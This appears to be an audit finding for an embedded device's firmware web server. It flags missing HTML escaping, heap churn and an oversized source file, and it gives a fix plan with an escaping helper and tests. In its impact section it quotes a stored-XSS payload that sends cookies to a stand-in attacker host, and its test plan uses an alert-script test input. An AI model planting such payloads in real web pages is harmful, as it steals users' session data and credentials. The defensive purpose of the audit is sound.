# H3 — Homegrown HTML templating in `web_server.cpp`, no escaping

- **Severity:** High
- **Area:** Security / code quality / memory
- **Files:**
  - `firmware/main/src/web_server.cpp` (1 876 lines, 14 URI handlers)
  - `firmware/main/src/web_ui.cpp`
  - `firmware/main/webui/*`

## What is wrong

The web server renders HTML by `std::string` concatenation, interleaving config-sourced values (`DeviceConfig::device_name`, SSID lists, hostname, backend URLs, error messages) directly into the output.

Three compounding problems:

1. **No visible HTML / attribute escaping.** If any `char[]` field that ends up in HTML contains `<`, `>`, `"`, `'`, or `&`, the resulting page is either broken or exploitable.
2. **Heap churn.** Every request grows std::strings on the heap; embedded long-running devices fragment quickly.
3. **Monolithic file.** 14 handlers + form parsing + content-type branching in one file makes the audit hard.

## Why it matters

- **Stored XSS.** Example path: user sets `device_name = "<script>fetch('http://attacker/'+document.cookie)</script>"`, then the status page reflects it back. Given the portal often serves Wi-Fi credentials and backend tokens, this is not academic.
- Even without a malicious user, a device name with `&` breaks page rendering.
- No authentication compounds the problem — see also the note in the review about portal auth.

## Consequences on real hardware

- XSS on the config portal is a realistic foothold in any shared-network deployment (office, school, municipal sensor).
- Rendering bugs confuse legitimate users who used quotes in their device name.

## Fix plan

1. **Introduce an `escapeHtml` helper:**
   ```cpp
   std::string escapeHtml(std::string_view in) {
       std::string out;
       out.reserve(in.size() + 16);
       for (char c : in) {
           switch (c) {
               case '&':  out += "&amp;";  break;
               case '<':  out += "&lt;";   break;
               case '>':  out += "&gt;";   break;
               case '"':  out += "&quot;"; break;
               case '\'': out += "&#39;";  break;
               default:   out += c;
           }
       }
       return out;
   }
   ```
2. **Audit every interpolation site.** Grep for string concatenation patterns (`" + config.`, `" + cfg.`) in `web_server.cpp` / `web_ui.cpp` and wrap every config-sourced value in `escapeHtml()`. Distinguish HTML context vs attribute context if you use any `"..."` attributes (use a stricter escaper there).
3. **Split `web_server.cpp` by route.** One file per handler group: `routes/status.cpp`, `routes/wifi.cpp`, `routes/backends.cpp`, etc. Keep a single route table in `web_server.cpp`.
4. **Pre-allocate response buffers.** Use `std::string::reserve(4096)` at the top of each handler; better, render into a `char[]` with `snprintf` for short fragments.
5. **Add basic authentication** on the portal (out of scope for this issue but noted).
6. **Add hostile input tests.** Host-side unit test renders each template with a payload of `<script>alert(1)</script>` and asserts the output does not contain `<script>`.
7. **Consider a tiny templating layer** — `mustache`-style `{{var}}` replacement that funnels through `escapeHtml` by default, with an explicit `{{{raw}}}` form for pre-escaped content. Avoid pulling in a heavyweight library.

## Verification

- Unit test: for each handler, verify an HTML-hostile device name is escaped everywhere.
- Manual smoke test: set `device_name = "Alice & Bob's <home>"`; page renders correctly and view-source shows the escaped form.
- File-size regression: `web_server.cpp` should shrink significantly after the split; each new file ≤ 300 lines.

## Related

- M7 (web server stack size) — pre-allocation reduces stack/heap pressure.
- The review flagged the absence of portal authentication as a separate concern.
